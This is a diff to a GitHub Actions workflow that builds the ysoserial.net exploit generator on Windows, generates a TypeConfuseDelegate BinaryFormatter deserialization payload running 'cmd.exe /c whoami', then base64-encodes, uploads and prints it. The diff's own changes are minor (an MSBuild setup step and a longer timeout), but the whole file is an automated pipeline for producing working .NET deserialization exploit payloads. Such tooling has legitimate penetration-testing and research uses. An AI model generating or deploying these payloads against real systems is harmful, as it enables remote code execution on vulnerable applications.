@@ -1,10 +1,11 @@
 name: Generate ysoserial Payload
 on:
   workflow_dispatch:
+
 jobs:
   build:
     runs-on: windows-latest
-    timeout-minutes: 15
+    timeout-minutes: 20
     defaults:
       run:
         shell: powershell
@@ -14,19 +15,26 @@ jobs:
         with:
           repository: pwntester/ysoserial.net
           path: ysoserial.net
+
+      - name: Setup MSBuild
+        uses: microsoft/setup-msbuild@v2
+
       - name: Build ysoserial.net
         run: msbuild ysoserial.net.sln /p:Configuration=Release
         working-directory: ./ysoserial.net
+
       - name: Generate Payload
         run: |
           .\ysoserial.exe -g TypeConfuseDelegate -c "cmd.exe /c whoami" -f BinaryFormatter > payload.bin
           $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.bin"))
           echo "PAYLOAD_B64=$b64" >> $env:GITHUB_ENV
         working-directory: ./ysoserial.net/ysoserial/bin/Release
+
       - name: Upload Payload
         uses: actions/upload-artifact@v4
         with:
           name: ysoserial-payload
           path: ysoserial.net/ysoserial/bin/Release/payload.bin
+
       - name: Output Base64
         run: 'echo "Base64 payload: $env:PAYLOAD_B64"'
